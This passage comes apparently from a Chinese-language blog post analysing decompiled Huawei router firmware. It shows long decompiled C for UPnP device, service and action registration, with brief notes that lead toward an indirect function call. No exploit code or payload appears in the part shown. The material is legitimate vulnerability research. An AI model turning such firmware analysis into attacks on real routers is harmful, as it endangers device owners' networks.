<span class="token number">0</span><span class="token punctuation">;</span>  local_120 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_11c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_118 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_114 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_110 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_10c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_108 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_104 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_100 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_fc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>g_stDevDesc<span class="token punctuation">.</span>_4_4_<span class="token punctuation">,</span><span class="token string">"InternetGatewayDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_128<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceUpgrade:1"</span><span class="token punctuation">,</span><span class="token string">"DevUpg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>                              <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_124<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"Layer3Forwarding:1"</span><span class="token punctuation">,</span><span class="token string">"L3Fwd.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_120<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"LANConfigSecurity:1"</span><span class="token punctuation">,</span><span class="token string">"LANSec.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_118<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"DevCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span>                              <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_11c<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_110<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANCommonInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanCommonIfc1.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_10c<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANDSLInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslIfCfg.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_114<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANConnectionDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_108<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANDSLLinkConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslLink.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>local_f0<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANIPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanIpConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANPPPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanPppConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_104<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"LANDevice:1"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_fc<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"LANHostConfigManagement:1"</span><span class="token punctuation">,</span><span class="token string">"LanHostCfgMgmt.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                 <span class="token operator">&amp;</span>local_f8<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"WLANConfiguration:1"</span><span class="token punctuation">,</span><span class="token string">"WLANCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_f4<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span> iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      local_e8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_2c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_30 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_34 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_38 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_3c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_40 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_44 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_48 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_4c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_50 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_54 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_58 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_5c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_60 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_64 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_68 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_118<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_6c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_70 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_74 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_78 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_7c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_80 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_84 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_88 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_8c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_90 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_94 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_98 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_9c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_ac <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_bc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_cc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_dc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> iVar1 <span class="token operator">+</span> local_e8 <span class="token operator">+</span> local_2c <span class="token operator">+</span> local_30 <span class="token operator">+</span> local_34 <span class="token operator">+</span> local_38 <span class="token operator">+</span> local_3c <span class="token operator">+</span> local_40 <span class="token operator">+</span>              local_44 <span class="token operator">+</span> local_48 <span class="token operator">+</span> local_4c <span class="token operator">+</span> local_50 <span class="token operator">+</span> local_54 <span class="token operator">+</span> local_58 <span class="token operator">+</span> local_5c <span class="token operator">+</span> local_60              <span class="token operator">+</span> local_64 <span class="token operator">+</span> local_68 <span class="token operator">+</span> local_6c <span class="token operator">+</span> local_70 <span class="token operator">+</span> local_74 <span class="token operator">+</span> local_78 <span class="token operator">+</span> local_7c <span class="token operator">+</span>              local_80 <span class="token operator">+</span> local_84 <span class="token operator">+</span> local_88 <span class="token operator">+</span> local_8c <span class="token operator">+</span> local_90 <span class="token operator">+</span> local_94 <span class="token operator">+</span> local_98 <span class="token operator">+</span> local_9c              <span class="token operator">+</span> local_a0 <span class="token operator">+</span> local_a4 <span class="token operator">+</span> local_a8 <span class="token operator">+</span> local_ac <span class="token operator">+</span> local_b0 <span class="token operator">+</span> local_b4 <span class="token operator">+</span> local_b8 <span class="token operator">+</span>              local_bc <span class="token operator">+</span> local_c0 <span class="token operator">+</span> local_c4 <span class="token operator">+</span> local_c8 <span class="token operator">+</span> local_cc <span class="token operator">+</span> local_d0 <span class="token operator">+</span> local_d4 <span class="token operator">+</span> local_d8              <span class="token operator">+</span> local_dc <span class="token operator">+</span> local_e0 <span class="token operator">+</span> local_e4 <span class="token operator">+</span> iVar2 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span>              iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>函数较长，可以不用每一行都明白，大致看懂了该函数的意思是，对于需要通信的设备和服务，进行各自的操作，跟进Action函数，查看一下后续操作。</p><p>在后续的操作中，不难发现该函数存在一个明显的间接函数调用。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ppcVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      __s2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_2 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          __s1 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>          iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span>__s2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span 